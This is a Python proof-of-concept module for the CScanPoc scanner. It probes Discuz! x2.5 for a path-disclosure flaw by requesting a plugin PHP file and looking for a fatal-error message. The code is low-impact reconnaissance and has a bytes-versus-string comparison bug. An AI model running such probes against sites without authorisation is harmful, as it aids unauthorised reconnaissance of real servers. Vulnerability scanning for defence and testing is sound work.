# coding: utf-8
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Discuz_0113'  # 平台漏洞编号，留空
    name = 'Discuz x2.5 /source/plugin/myrepeats/table/table_myrepeats.php 泄漏服务器物理路径'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2014-10-18'  # 漏洞公布时间
    desc = '''
    Discuz x2.5 /source/plugin/myrepeats/table/table_myrepeats.php 泄漏服务器物理路径。
    '''  # 漏洞描述
    ref = 'http://www.2cto.com/Article/201211/171301.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Discuz!'  # 漏洞应用名称
    product_version = 'x2.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '03e3c7a4-2bb0-44dc-9f88-7a49b556f9b7'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            verify_url = self.target + '/source/plugin/myrepeats/table/table_myrepeats.php'
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()
            if '<b>Fatal error</b>:' in content and '/table_myrepeats.php</b>' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
